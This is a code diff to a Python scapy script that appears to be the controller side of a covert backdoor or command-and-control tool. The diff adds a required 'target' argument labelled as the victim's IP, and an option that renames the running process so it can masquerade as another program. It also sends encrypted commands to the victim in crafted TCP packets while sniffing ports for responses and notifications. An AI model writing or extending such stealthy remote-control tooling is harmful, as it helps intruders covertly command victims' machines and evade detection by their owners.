@@ -3,9 +3,31 @@
 
 from scapy.all import *
 from multiprocessing import Process
-import sys, time
+import sys, time, argparse, setproctitle
 import encryption as encryption
 
+
+# Parse command-line arguments
+parser = argparse.ArgumentParser()
+
+parser.add_argument("-t",
+                    "--target",
+                    type=str,
+                    help="IP of target host (victim)",
+                    required=True)
+
+parser.add_argument("-m",
+                    "--masq",
+                    type=str,
+                    help="Process name of this app, to masquerade as",
+                    required=False)      
+
+global parseargs
+parseargs = parser.parse_args()
+
+# Masquerade this app's process name, if provided
+if parseargs.masq is not None:
+    setproctitle.setproctitle(parseargs.masq)
 
 is_running = False
 processes_list = []
@@ -13,12 +35,12 @@ processes_list = []
 
 def sniff_response():
     while True:
-        sniff(filter="ip and tcp and host 192.168.1.65 and dst port 8500", count=1, prn=read_pkt)
+        sniff(filter=f"ip and tcp and host {parseargs.target} and dst port 8500", count=1, prn=read_pkt)
 
 
 def sniff_notifs():
     while True:
-        sniff(filter="ip and tcp and host 192.168.1.65 and dst port 8888", count=1, prn=print_notifs)
+        sniff(filter=f"ip and tcp and host {parseargs.target} and dst port 8888", count=1, prn=print_notifs)
 
 
 def print_notifs(pkt):
@@ -77,7 +99,7 @@ def init_func(mode, *args):
         encrypted_arg = encryption.encrypt_data(args[0].encode("utf-8"))
         contents += encrypted_arg.decode("utf-8") + delimiter
 
-    pkt = IP(dst="192.168.1.65")/TCP(sport=RandShort(), dport=8505)/Raw(load=contents)
+    pkt = IP(dst=parseargs.target)/TCP(sport=RandShort(), dport=8505)/Raw(load=contents)
 
     send(pkt, verbose=False)
     time.sleep(1)
